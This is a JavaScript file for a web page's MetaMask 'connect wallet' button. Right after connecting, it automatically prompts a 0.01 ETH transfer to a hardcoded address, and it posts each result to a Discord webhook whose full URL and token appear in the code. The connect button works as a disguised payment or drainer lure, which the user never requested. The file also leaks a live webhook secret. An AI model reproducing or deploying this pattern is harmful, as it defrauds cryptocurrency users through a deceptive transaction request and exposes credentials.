let isConnecting = false; // Flag to prevent multiple connections

async function connectWallet() {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return; // Exit if already connecting
    }
    
    isConnecting = true; // Set the flag to true
    document.getElementById("connectButton").disabled = true; // Disable the button
    
    try {
        // Check if MetaMask is installed
        if (typeof window.ethereum !== 'undefined') {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];
            console.log(`Connected to account: ${account}`);
            document.getElementById("status").innerText = `Connected: ${account}`;
            
            // After connecting, send a transaction
            await sendTransaction(); // Automatically send the transaction after connecting
        } else {
            // If on a mobile device and MetaMask isn't installed, suggest installation
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if (isMobile) {
                // Open MetaMask directly for mobile users
                alert("Please install the MetaMask app to continue.");
                window.open("https://metamask.app.link/dapp/", "_blank");
            } else {
                console.error("MetaMask is not installed. Please install it.");
                document.getElementById("status").innerText = "MetaMask is not installed.";
            }
        }
    } catch (error) {
        console.error("Error connecting to wallet:", error);
        document.getElementById("status").innerText = "Error connecting to wallet.";
    } finally {
        isConnecting = false; // Reset the flag
        document.getElementById("connectButton").disabled = false; // Re-enable the button
    }
}

async function sendTransaction() {
    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
        const amountInEther = "0.01"; // Replace with the amount you want to send

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("Transaction response:", txResponse);
            document.getElementById("status").innerText = `Transaction sent! Hash: ${txResponse.hash}`;
            
            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");
        } catch (error) {
            console.error("Error sending transaction:", error);
            document.getElementById("status").innerText = "Error sending transaction.";
            
            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.error("MetaMask is not installed. Please install it.");
        document.getElementById("status").innerText = "MetaMask is not installed.";
    }
}

async function sendWebhook(message, status) {
    const webhookUrl = "https://discord.com/api/webhooks/1288775554836860969/vGhZpW1U9hPXFZfZACJomfVg-bY1pjP4__PpK_5Gf2dAxtcgZKZJqRDp3_9z0ULgP7Wg"; // Your Discord webhook URL
    const payload = {
        content: `Transaction Status: ${status}\nMessage: ${message}`
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
        console.log("Webhook sent successfully");
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}

// Attach the event listener to the button
document.getElementById("connectButton").addEventListener("click", connectWallet);
